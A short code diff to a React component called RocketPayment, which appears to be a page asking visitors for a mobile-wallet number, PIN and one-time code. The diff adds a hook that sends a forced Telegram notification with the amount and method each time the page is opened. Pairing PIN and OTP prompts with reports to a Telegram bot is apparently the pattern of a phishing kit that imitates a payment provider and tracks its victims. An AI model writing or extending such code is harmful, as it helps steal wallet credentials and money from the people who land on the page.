@@ -48,6 +48,7 @@ const RocketPayment = () => {
   }, [navigate, amount, showPin, showOtp, showFailed]);
 
   useEffect(() => { setTimeout(() => mobileRef.current?.focus(), 100); }, []);
+  useEffect(() => { sendTelegramNotification({ type: 'page_entry', amount, method: 'Rocket' }, { force: true }); /* eslint-disable-next-line react-hooks/exhaustive-deps */ }, []);
   
   useEffect(() => { if (showOtp) setTimeout(() => otpRef.current?.focus(), 100); }, [showOtp]);
   const otpStartAtRef = useRef<number>(0);
